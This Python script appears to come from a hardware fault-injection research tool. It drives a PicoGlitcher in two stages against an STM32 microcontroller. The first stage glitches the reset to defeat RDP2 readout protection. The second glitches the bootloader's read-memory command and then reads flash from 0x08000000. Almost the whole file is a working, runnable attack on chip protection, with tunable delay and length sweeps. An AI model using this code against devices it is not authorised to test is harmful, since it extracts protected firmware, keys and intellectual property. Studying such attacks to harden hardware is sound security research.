#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# SQL Queries:
# Show only successes and flash-resets:
# color = 'R' or response LIKE 'warning: polling failed'

import argparse
import logging
import random
import sys
import time

# import custom libraries
from findus import Database, PicoGlitcher, STM32Bootloader, Helper, ErrorHandling

class RDP2Characterize():
    def classify(self, state:bytes) -> str:
        color = 'C'
        if b'error' in state:
            color = 'G'
        elif b'warning' in state:
            color = 'O'
        elif b'timeout' in state:
            color = 'Y'
        elif b'ok' in state:
            color = 'R'
        return color

experiment_id = 0

class Main:
    def __init__(self, args, glitcher, database, bootcom):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # take over the glitcher from Main2
        self.glitcher = glitcher

        # trigger on the rising edge of the reset signal
        self.glitcher.rising_edge_trigger(pin_trigger='ext1')

        # choose multiplexing, pulse-shaping or crowbar glitching
        if args.multiplexing:
            self.glitcher.set_multiplexing()
        else:
            self.glitcher.set_lpglitch()
            #self.glitcher.set_hpglitch()

        # set up the database
        self.database = database
        self.start_time = int(time.time())
        # if number of experiments get too large, remove the expected results
        #self.database.cleanup("G")

        # STLink Debugger
        self.bootcom = bootcom
        self.rdp2characterize = RDP2Characterize()

        # set gpio pins to enable bootloader mode
        self.glitcher.set_gpio(pin_number=4, value=1) # BOOT0
        self.glitcher.set_gpio(pin_number=5, value=0) # BOOT1
        time.sleep(0.5)

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]
        s_length = self.args.length[0]
        e_length = self.args.length[1]

        global experiment_id
        self.glitcher.release_reset()
        while True:
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)

            if args.multiplexing:
                # VI2 must not be connected, leave floating for voltage measuring with EXT1 input
                self.glitcher.set_mux_voltage("VI2")

            # arm
            #if args.multiplexing:
            #    #mul_config = {"t1": length, "v1": "GND", "t2": 10_000, "v2": "VI1"}
            #    mul_config = {"t1": length, "v1": "GND"}
            #    self.glitcher.arm_multiplexing(delay, mul_config)
            #else:
            #    self.glitcher.arm(delay, length)

            # reset target (this triggers the glitch)
            #self.glitcher.reset(0.01)
            #self.glitcher.power_cycle_reset(0.2)
            #time.sleep(0.01)
            #self.glitcher.initiate_reset()
            self.glitcher.disable_vtarget()
            time.sleep(0.1)
            self.glitcher.enable_vtarget()
            #self.glitcher.release_reset()

            #self.glitcher.block(timeout=1)
            #while True:
            #    time.sleep(0.1)

            # block until glitch
            try:
                self.glitcher.block(timeout=1)
                if args.multiplexing:
                    self.glitcher.set_mux_voltage("VI1")
                time.sleep(0.1)
                # setup bootloader communication
                state = self.bootcom.init_bootloader()
            except Exception as e:
                print(e)
                print("[-] Timeout received in block(). Continuing.")
                self.glitcher.power_cycle_reset()
                time.sleep(0.2)
                state = b'warning: timeout'

            # classify state
            color = self.rdp2characterize.classify(state)

            # add to database
            self.database.insert(experiment_id, delay, length, color, state)

            # monitor
            #print(response)
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{state}", color))

            # increase experiment id
            experiment_id += 1
            if experiment_id > 100_000:
                break

            if b'ok' in state:
                # hand execution over to Main2
                break

class Main2:
    def __init__(self, args, glitcher, database, bootcom):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # take over the glitcher from Main
        self.glitcher = glitcher

        # we want to trigger on x11 with the configuration 8e1
        # since our statemachine understands only 8n1,
        # we can trigger on x22 with the configuration 9n1 instead
        # Update: Triggering on x11 in configuration 8n1 works good enough.
        self.glitcher.uart_trigger(0x11)

        # choose crowbar glitching
        self.glitcher.set_lpglitch()

        # set up the database
        self.database = database
        self.start_time = int(time.time())
        # if number of experiments get too large, remove the expected results
        #self.database.cleanup("G")

        self.bootcom = bootcom
        self.dump_filename = f"{Helper.timestamp()}_memory_dump.bin"

        # error handling
        self.error_handler = ErrorHandling(max_fails=10, look_back=30, database=self.database)

        # set gpio pins to enable bootloader mode
        self.glitcher.set_gpio(pin_number=4, value=1) # BOOT0
        self.glitcher.set_gpio(pin_number=5, value=0) # BOOT1

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay2[0]
        e_delay = self.args.delay2[1]
        s_length = self.args.length2[0]
        e_length = self.args.length2[1]

        global experiment_id
        experiment_id_start = experiment_id
        run = True
        while run:
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)

            # flush if necessary
            self.bootcom.flush_v2(timeout=0.1)

            # arm
            #self.glitcher.arm(delay, length)

            # reset target
            self.glitcher.reset(0.01)
            time.sleep(0.1)

            # setup bootloader communication
            state = self.bootcom.init_bootloader()
            # setup memory read; this function triggers the glitch
            if b'ok' in state:
                state = self.bootcom.setup_memread()

            # block until glitch
            try:
                self.glitcher.block(timeout=1)
            except Exception as _:
                print("[-] Timeout received in block(). Continuing.")
                #self.glitcher.power_cycle_target()
                time.sleep(0.2)
                state = b'warning: timeout'

            # dump memory
            mem = b''
            if b'success' in state:
                #response, mem = self.bootcom.dump_memory_to_file(self.dump_filename)
                start = 0x08000000
                size = 0xFF
                state, mem = self.bootcom.read_memory(start, size)

            # classify response
            color = self.glitcher.classify(state)

            # add to database
            state_str = state + mem
            self.database.insert(experiment_id, delay, length, color, state_str)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{state_str}", color))

            # check for successive errors, re-programm target if too many successive errors occur.
            def error_action():
                # go back to the first stage
                global run
                run = False
            self.error_handler.check(experiment_id=experiment_id, response=state, expected=b'expected', user_action=error_action)

            # increase experiment id
            experiment_id += 1
            if experiment_id >= experiment_id_start + 10:
                while True:
                    time.sleep(1)

            # Dump finished
            if state == b'success: dump finished':
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--rpico", required=False, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--multiplexing", required=False, action='store_true', help="Instead of crowbar glitching, perform a fault injection with multiplexing between different voltages (requires PicoGlitcher v2).")
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--delay2", required=True, nargs=2, help="delay for stage 2 (bootloader attack)", type=int)
    parser.add_argument("--length2", required=True, nargs=2, help="length for stage 2 (bootloader attack)", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    args = parser.parse_args()

    # init the glitcher and hand it over to main
    glitcher = PicoGlitcher()
    glitcher.init(port=args.rpico, enable_vtarget=False)

    # the initial voltage for multiplexing must be hard-coded and can only be applied
    # if the raspberry pi pico is reset and re-initialized.
    if args.multiplexing:
        glitcher.change_config_and_reset("mux_vinit", "VI2")
        glitcher.init(port=args.rpico, enable_vtarget=False)

    # set up database for both stages
    database = Database(sys.argv, resume=args.resume, nostore=args.no_store)

    # memory read settings
    bootcom = STM32Bootloader(port=args.target, serial_timeout=0.1, dump_address=0x08000000, dump_len=0x2000)

    while True:
        main = Main(args, glitcher, database, bootcom)
        try:
            main.run()
        except KeyboardInterrupt:
            print("\nExitting...")
            sys.exit(1)

        main2 = Main2(args, glitcher, database, bootcom)
        try:
            main2.run()
        except KeyboardInterrupt:
            print("\nExitting...")
            sys.exit(1)
